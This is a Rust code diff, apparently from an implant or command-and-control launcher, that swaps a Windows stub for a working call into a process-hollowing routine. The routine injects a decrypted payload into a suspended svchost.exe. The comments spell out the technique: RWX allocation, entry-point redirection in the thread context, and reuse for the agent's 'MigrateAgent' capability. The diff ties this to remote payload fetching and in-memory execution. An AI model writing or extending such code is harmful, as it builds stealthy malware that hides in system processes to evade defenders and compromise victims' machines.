@@ -168,16 +168,23 @@ fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
 }
 
 #[cfg(target_os = "windows")]
-fn execute_in_memory(_payload: &[u8], _args: &[String]) -> Result<()> {
-    // Windows process-hollowing (CreateProcessW(CREATE_SUSPENDED) +
-    // NtUnmapViewOfSection + VirtualAllocEx + WriteProcessMemory +
-    // SetThreadContext + ResumeThread) is implemented in a future revision;
-    // see docs/DESIGN.md "Launcher: Remote Payload Fetch and In-Memory
-    // Execution". For now we refuse rather than write a file silently.
-    Err(anyhow!(
-        "In-memory agent execution on Windows is not yet implemented. \
-         See docs/DESIGN.md for the planned process-hollowing approach."
-    ))
+fn execute_in_memory(payload: &[u8], _args: &[String]) -> Result<()> {
+    // Windows path: spawn a host process suspended (svchost.exe), allocate
+    // RWX memory in it, copy the decrypted PE payload into that memory,
+    // redirect the entry point in the thread context, and resume the
+    // thread. Implementation lives in the shared `hollowing` crate so the
+    // agent's `MigrateAgent` capability and this launcher use exactly the
+    // same primitive.
+    //
+    // The launched payload runs detached from this process and inherits no
+    // arguments, so `_args` is intentionally unused; arguments must be
+    // baked into the payload at build time (`cargo build --release` with
+    // any compile-time flags the agent needs).
+    tracing::info!(
+        bytes = payload.len(),
+        "launching payload via process hollowing into svchost.exe"
+    );
+    hollowing::hollow_and_execute(payload).map_err(|e| anyhow!("process hollowing failed: {e}"))
 }
 
 #[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
